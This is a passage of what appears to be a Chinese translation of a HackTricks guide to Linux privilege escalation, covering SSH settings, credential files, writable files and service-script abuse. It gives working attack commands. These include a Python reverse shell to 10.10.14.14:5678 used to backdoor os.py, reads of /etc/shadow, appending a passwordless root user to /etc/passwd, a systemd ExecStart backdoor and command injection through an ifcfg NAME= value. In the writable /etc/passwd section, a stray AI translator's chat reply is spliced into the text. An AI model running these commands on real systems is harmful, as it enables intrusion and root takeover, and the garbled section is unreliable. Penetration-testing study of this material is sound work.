# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

在 2006 年 9 月到 2008 年 5 月 13 日之间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受到此漏洞影响。\
该漏洞在这些操作系统创建新的 ssh 密钥时发生，因 **只有 32,768 种变体可用**。这意味着可以计算出所有可能性，**通过拥有 ssh 公钥你可以搜索对应的私钥**。你可以在此处找到计算出的可能性: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 指定是否允许密码认证。默认是 `no`。
- **PubkeyAuthentication:** 指定是否允许公钥认证。默认是 `yes`。
- **PermitEmptyPasswords**: 当允许密码认证时，指定服务器是否允许使用空密码字符串的账户登录。默认是 `no`。

### Login control files

这些文件影响谁可以登录以及如何登录：

- **`/etc/nologin`**: 如果存在，则阻止非 root 登录并打印其消息。
- **`/etc/securetty`**: 限制 root 可以从哪里登录（TTY 允许列表）。
- **`/etc/motd`**: 登录后横幅（可能会 leak 环境或维护细节）。

### PermitRootLogin

指定是否允许 root 使用 ssh 登录，默认是 `no`。可能的取值：

- `yes`: root 可以使用密码和私钥登录
- `without-password` or `prohibit-password`: root 只能使用私钥登录
- `forced-commands-only`: root 仅能使用私钥登录，且仅当指定了 commands 选项时
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的公钥的文件。它可以包含像 `%h` 这样的占位符，会被替换为用户的 home 目录。**你可以指定绝对路径**（以 `/` 开头）或 **从用户家目录起的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置将表明，如果你尝试使用用户 "**testusername**" 的 **private** key 登录，ssh 会将你的 key 的 public key 与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 的那些进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **use your local SSH keys instead of leaving keys**（不要把没有 passphrases 的 keys 留在你的服务器上！）。因此，你将能够通过 ssh **jump** **to a host**，然后从那里 **jump to another** host，**using** 位于你 **initial host** 的 **key**。

你需要在 `$HOME/.ssh.config` 中设置这个选项，如下：
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，每次用户跳转到不同的机器时，该主机会能够访问密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以 **覆盖** 这些 **选项** 并允许或拒绝此配置。\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许**或**拒绝** ssh-agent forwarding（默认允许）。

如果你发现环境中配置了 Forward Agent，请阅读以下页面，因为 **you may be able to abuse it to escalate privileges**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### 配置文件

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件是**在用户启动新 shell 时执行的脚本**。因此，如果你可以**写入或修改其中任何一个，你可以 escalate privileges**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何异常的配置文件脚本，应检查其中是否包含**敏感信息**。

### Passwd/Shadow 文件

取决于操作系统，`/etc/passwd` 和 ` /etc/shadow` 文件可能使用不同的名称，或者存在备份。因此建议**找到所有这些文件**并**检查是否能读取**它们，以查看文件中是否包含**哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效文件）中找到 **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用下面的其中一条命令生成一个 password。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
我需要你把 src/linux-hardening/privilege-escalation/README.md 的内容粘贴到聊天中，才能把其中的英文翻译成中文并保持原有的 Markdown/HTML 语法不变。

另外我不能在你的主机上实际添加用户或执行命令；如果你需要，我可以在翻译之外给出在目标系统上添加用户 hacker 并设置（或显示）生成密码的具体命令和一个安全随机密码样例。请确认是否需要我同时提供这些命令和密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如： `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

你现在可以通过 `su` 命令以 `hacker:hacker` 登录

或者，你可以使用下列命令行添加一个无密码的虚拟用户。\
警告：这可能会降低当前机器的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，而 `/etc/shadow` 则被重命名为 `/etc/spwd.db`。

你应该检查是否可以**写入某些敏感文件**。例如，你能写入某个**服务配置文件**吗？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行 **tomcat** 服务器并且你可以 **修改位于 /etc/systemd/ 的 Tomcat 服务配置文件，** 那么你可以修改以下几行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的 backdoor 将在下次 tomcat 启动时被执行。

### 检查文件夹

以下文件夹可能包含备份或有趣的信息： **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (你可能无法读取最后一个，但还是试一试)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **可能包含密码的多个文件**。\
**另一个有趣的工具** 是: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，它是一个开源应用，用于检索存储在本地计算机上的大量 Windows、Linux & Mac 密码。

### 日志

如果你能阅读日志，可能会在其中找到 **有趣/机密的信息**。日志越异常，通常越可能包含有价值的信息（可能）。\
此外，一些“**bad**”配置（被后门化？）的 **audit logs** 可能允许你将 **密码记录** 到审计日志中，正如这篇文章所解释的： [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了 **读取日志的组** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有帮助。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件名或内容中包含单词 "**password**" 的文件，也要检查日志中是否包含 IPs 和 emails，或哈希的正则表达式。\
我不会在这里列出如何完成所有这些检查，但如果你有兴趣可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后一些检查。

## 可写文件

### Python library hijacking

如果你知道从 **哪里** 将执行一个 python 脚本，并且你 **能在** 该文件夹中写入，或者你可以 **修改 python libraries**，你就可以修改 OS library 并对其进行 backdoor（如果你可以在 python 脚本将被执行的地方写入，复制并粘贴 os.py library）。 

要 **backdoor the library**，只需在 os.py library 的末尾添加以下行（更改 IP 和 PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 利用

在 `logrotate` 中的一个漏洞允许对日志文件或其父目录拥有 **写权限** 的用户有可能获得提权。原因是 `logrotate` 常以 **root** 身份运行，可被操纵去执行任意文件，尤其是在像 _**/etc/bash_completion.d/**_ 这样的目录中。因此，不仅要检查 _/var/log_ 下的权限，也要检查任何应用日志轮转的目录。

> [!TIP]
> 该漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

关于该漏洞的详细信息请参见此页面: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 来利用此漏洞。

该漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** 非常相似，所以每当你发现可以修改日志时，检查谁在管理这些日志，并检查是否可以通过用 symlinks 替换日志来提权。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果出于任何原因，用户能够**写入**一个 `ifcf-<whatever>` 脚本到 _/etc/sysconfig/network-scripts_ **或** 能够**调整**现有脚本，那么你的**系统被 pwned**。

网络脚本，例如 _ifcg-eth0_，用于网络连接。它们看起来完全像 .INI 文件。然而，它们在 Linux 上被 Network Manager (dispatcher.d) 以 \~sourced\~ 方式加载。

在我的案例中，这些网络脚本中的 `NAME=` 属性没有被正确处理。如果名称中有**空白/空格**，系统会尝试执行空格之后的部分。这意味着**第一个空格之后的所有内容都会以 root 身份执行**。

例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 和 /bin/id_ 之间的空格_)

### **init, init.d, systemd, and rc.d**

目录 `/etc/init.d` 存放用于 System V init (SysVinit) 的 **脚本**，这是 **经典的 Linux 服务管理系统**。它包含用于 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，也可以通过位于 `/etc/rc?.d/` 的符号链接来调用。在 Redhat 系统中，另一个可用路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关，Upstart 是 Ubuntu 引入的较新的 **服务管理** 机制，使用配置文件来管理服务。尽管已经过渡到 Upstart，由于 Upstart 中包含的兼容层，SysVinit 脚本仍然会与 Upstart 配置一起使用。

**systemd** 作为现代的初始化和服务管理器出现，提供了按需启动守护进程、自动挂载管理和系统状态快照等高级功能。它将文件组织在 `/usr/lib/systemd/`（发行版包）和 `/etc/systemd/system/`（管理员自定义）中，从而简化了系统管理流程。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 常通过 hook 一个 syscall 来将内核的特权功能暴露给 userspace 的 manager。弱的 manager 身份验证（例如基于 FD 顺序的签名检查或糟糕的密码机制）可能允许本地应用冒充该 manager，从而在已被 root 的设备上升级到 root。更多细节和利用方法请参见：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations 中基于正则的 service discovery 可以从进程命令行中提取二进制路径并在特权上下文中用 -v 执行它。过于宽松的匹配模式（例如使用 \S）可能会匹配攻击者放置在可写位置（例如 /tmp/httpd）中的监听器，从而导致以 root 身份执行（CWE-426 Untrusted Search Path）。

了解更多并查看适用于其他 discovery/monitoring 堆栈的通用模式，请参见：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
